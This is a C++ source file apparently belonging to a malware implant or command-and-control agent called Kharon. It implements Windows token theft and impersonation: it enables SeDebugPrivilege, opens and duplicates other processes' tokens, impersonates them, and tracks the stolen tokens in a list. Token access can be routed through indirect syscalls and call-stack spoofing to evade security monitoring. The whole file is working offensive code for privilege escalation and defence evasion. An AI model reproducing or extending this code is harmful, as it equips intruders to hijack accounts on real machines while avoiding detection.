#include <Kharon.h>

using namespace Root;

auto DECLFN Token::Current( VOID ) -> HANDLE {
    HANDLE hToken = INVALID_HANDLE_VALUE;
    
    if ( 
        this->TdOpen( NtCurrentThread(), TOKEN_QUERY, FALSE, &hToken ) && 
        hToken != INVALID_HANDLE_VALUE
    ) {
        return hToken;
    }
    
    if (
        this->ProcOpen(NtCurrentProcess(), TOKEN_QUERY, &hToken ) && 
        hToken != INVALID_HANDLE_VALUE
    ) {
        return hToken;
    }
    
    return INVALID_HANDLE_VALUE;
}

auto DECLFN Token::GetUser(
    _In_  HANDLE TokenHandle
) -> CHAR* {
    TOKEN_USER*  TokenUserPtr = nullptr;
    SID_NAME_USE SidName      = SidTypeUnknown;
    NTSTATUS     NtStatus     = STATUS_SUCCESS;

    CHAR* UserDom   = nullptr;
    ULONG TotalLen  = 0;
    ULONG ReturnLen = 0;
    ULONG DomainLen = 0;
    ULONG UserLen   = 0;
    BOOL  Success   = FALSE;

    NtStatus = Self->Ntdll.NtQueryInformationToken( TokenHandle, TokenUser, NULL, 0, &ReturnLen );
    if ( NtStatus != STATUS_BUFFER_TOO_SMALL ) {
        goto _KH_END;
    }

    TokenUserPtr = ( PTOKEN_USER )Self->Hp->Alloc( ReturnLen );
    if ( !TokenUserPtr ) {
        goto _KH_END;
    }

    NtStatus = Self->Ntdll.NtQueryInformationToken( TokenHandle, TokenUser, TokenUserPtr, ReturnLen, &ReturnLen );
    if ( !NT_SUCCESS( NtStatus ) ) { goto _KH_END; }

    Success = Self->Advapi32.LookupAccountSidA(
        NULL, TokenUserPtr->User.Sid, NULL,
        &UserLen, NULL, &DomainLen, &SidName
    );

    if ( !Success && KhGetError == ERROR_INSUFFICIENT_BUFFER ) {
        TotalLen = UserLen + DomainLen + 2;

        UserDom = (CHAR*)Self->Hp->Alloc( TotalLen );
        if ( !UserDom ) { goto _KH_END; }

        CHAR  Domain[DomainLen];
        CHAR  User[UserLen];

        Success = Self->Advapi32.LookupAccountSidA(
            NULL, TokenUserPtr->User.Sid, User,
            &UserLen, Domain, &DomainLen, &SidName
        );
        if ( !Success ) goto _KH_END;
        
        Str::ConcatA( UserDom, Domain );
        Str::ConcatA( UserDom, "\\" );
        Str::ConcatA( UserDom, User );
    }

_KH_END:
    if ( TokenUserPtr ) {
        Self->Hp->Free( TokenUserPtr );
    }

    if ( !Success ) {
        Self->Hp->Free( UserDom );
        UserDom = nullptr;
    }
    
    return UserDom;
}

auto DECLFN Token::GetByID(
    _In_ ULONG TokenID
) -> HANDLE {
    TOKEN_NODE* Current = this->Node;

    while ( Current->Next ) {
        if ( TokenID == Current->TokenID ) {
            return Current->Handle;
        }

        Current = Current->Next;
    }

    return nullptr;
}

auto DECLFN Token::Rev2Self( VOID ) -> BOOL {
    return Self->Advapi32.RevertToSelf();
}

auto DECLFN Token::Rm(
    _In_ ULONG TokenID
) -> BOOL {
    TOKEN_NODE* Current  = this->Node;
    TOKEN_NODE* Previous = nullptr;

    if ( !Current ) {
        return FALSE;
    }

    if ( Current->TokenID == TokenID ) {
        this->Node = Current->Next;
        Self->Ntdll.NtClose( Current->Handle );
        Self->Hp->Free( Current->User );
        Self->Hp->Free( Current);
        return TRUE;
    }

    while ( Current && Current->TokenID != TokenID ) {
        Previous = Current;
        Current = Current->Next;
    }

    if ( Current ) {
        Previous->Next = Current->Next;
        Self->Ntdll.NtClose( Current->Handle );
        Self->Hp->Free( Current->User );
        Self->Hp->Free( Current );
        return TRUE;
    }

    return FALSE;
}

auto DECLFN Token::Use(
    _In_ HANDLE TokenHandle
) -> BOOL {
    return Self->Advapi32.ImpersonateLoggedOnUser( TokenHandle ); 
}

auto DECLFN Token::Steal(
    _In_ ULONG ProcessID
) -> TOKEN_NODE* {
    HANDLE TokenHandle   = INVALID_HANDLE_VALUE;
    HANDLE ProcessHandle = INVALID_HANDLE_VALUE;

    LONG  TokenFlags = TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY | TOKEN_DUPLICATE;
    ULONG TokenID    = Rnd32() % 9999;

    KhDbg("ID: %d", TokenID);

    KhDbg( "%d", KhGetError );
    TokenHandle = this->Current();

    KhDbg( "%d", KhGetError );
    this->SetPriv( TokenHandle, "SeDebugPrivilege" );

    KhDbg( "%d", KhGetError );
    Self->Ntdll.NtClose( TokenHandle );
    KhDbg( "%d", KhGetError );

    KhDbg( "proc %d", ProcessID );

    ProcessHandle = Self->Ps->Open( PROCESS_QUERY_INFORMATION, TRUE, ProcessID );
    if ( ProcessHandle == INVALID_HANDLE_VALUE || !ProcessHandle ) return nullptr;

    KhDbg( "Process Opened" );

    Self->Tkn->ProcOpen( ProcessHandle, TokenFlags, &TokenHandle );
    if ( TokenHandle == INVALID_HANDLE_VALUE || !TokenHandle ) return nullptr;

    KhDbg( "Token Opened" );

    TOKEN_NODE* NewNode = (TOKEN_NODE*)Self->Hp->Alloc( sizeof( TOKEN_NODE ) );

    while( this->GetByID( TokenID ) ) {
        TokenID = Rnd32() % 9999;
    }

    NewNode->Handle    = TokenHandle;
    NewNode->Host      = Self->Machine.CompName;
    NewNode->ProcessID = ProcessID;
    NewNode->User      = this->GetUser( TokenHandle );
    NewNode->TokenID   = TokenID;

    if ( !this->Node ) {
        this->Node = NewNode;
    } else {
        TOKEN_NODE* Current = this->Node;

        while ( Current->Next ) {
            Current = Current->Next;
        }
        Current->Next = NewNode;
    }

    if ( ProcessHandle ) Self->Ntdll.NtClose( ProcessHandle );

    return NewNode;
}

auto DECLFN Token::SetPriv(
    _In_ HANDLE Handle,
    _In_ CHAR*  PrivName
) -> BOOL {
    LUID Luid = { 0 };

    TOKEN_PRIVILEGES Privs = { 0 };

    BOOL Success = FALSE;

    Success = Self->Advapi32.LookupPrivilegeValueA( nullptr, PrivName, &Luid );
    if ( !Success ) return Success;

    Privs.PrivilegeCount           = 1;
    Privs.Privileges[0].Luid       = Luid;
    Privs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    Success = Self->Advapi32.AdjustTokenPrivileges( Handle, FALSE, &Privs, sizeof( TOKEN_PRIVILEGES ), nullptr, 0 );
    return Success;
}

auto DECLFN Token::TdOpen(
    _In_  HANDLE  ThreadHandle,
    _In_  ULONG   RightsAccess,
    _In_  BOOL    OpenAsSelf,
    _Out_ HANDLE* TokenHandle
) -> BOOL {
    const UINT32 Flags = SYSCALL_FLAGS;
    NTSTATUS Status = STATUS_UNSUCCESSFUL;

    if (!(Flags & (SYSCALL_INDIRECT | SYSCALL_SPOOF))) {
        return Self->Advapi32.OpenThreadToken(
            ThreadHandle, RightsAccess, OpenAsSelf, TokenHandle
        );
    }

    UPTR Address = (Flags & SYSCALL_INDIRECT)
        ? (UPTR)Self->Sys->Ext[Sys::OpenThToken].Instruction
        : (UPTR)Self->Ntdll.NtOpenThreadTokenEx;

    UPTR ssn = (Flags & SYSCALL_INDIRECT)
        ? (UPTR)Self->Sys->Ext[Sys::OpenThToken].ssn
        : 0;

    if (Flags & SYSCALL_INDIRECT && !(Flags & SYSCALL_SPOOF)) {
        SyscallExec(
            Sys::OpenThToken, Status, ThreadHandle, 
            RightsAccess, OpenAsSelf, 0, TokenHandle
        );
    } else {
        Status = Self->Spf->Call(
            Address, ssn, (UPTR)ThreadHandle, (UPTR)RightsAccess,
            (UPTR)OpenAsSelf, 0, (UPTR)TokenHandle
        );
    }

    Self->Usf->NtStatusToError(Status);
    return NT_SUCCESS(Status);
}

auto DECLFN Token::ProcOpen(
    _In_  HANDLE  ProcessHandle,
    _In_  ULONG   RightsAccess,
    _Out_ HANDLE* TokenHandle
) -> BOOL {
    const UINT32 Flags  = SYSCALL_FLAGS;
    NTSTATUS     Status = STATUS_UNSUCCESSFUL;

    if ( ! ( Flags & (SYSCALL_INDIRECT | SYSCALL_SPOOF) ) ) {
        return Self->Advapi32.OpenProcessToken(
            ProcessHandle, RightsAccess, TokenHandle
        );
    }

    UPTR Address = (Flags & SYSCALL_INDIRECT)
        ? (UPTR)Self->Sys->Ext[Sys::OpenPrToken].Instruction
        : (UPTR)Self->Ntdll.NtOpenProcessTokenEx;

    UPTR ssn = (Flags & SYSCALL_INDIRECT)
        ? (UPTR)Self->Sys->Ext[Sys::OpenPrToken].ssn
        : 0;

    if (Flags & SYSCALL_INDIRECT && !(Flags & SYSCALL_SPOOF)) {
        SyscallExec(Sys::OpenPrToken, Status, ProcessHandle,
                   RightsAccess, 0, TokenHandle);
    } else {
        Status = Self->Spf->Call(
            Address, ssn, (UPTR)ProcessHandle, (UPTR)RightsAccess,
            0, (UPTR)TokenHandle
        );
    }

    Self->Usf->NtStatusToError(Status);

    return NT_SUCCESS(Status);
}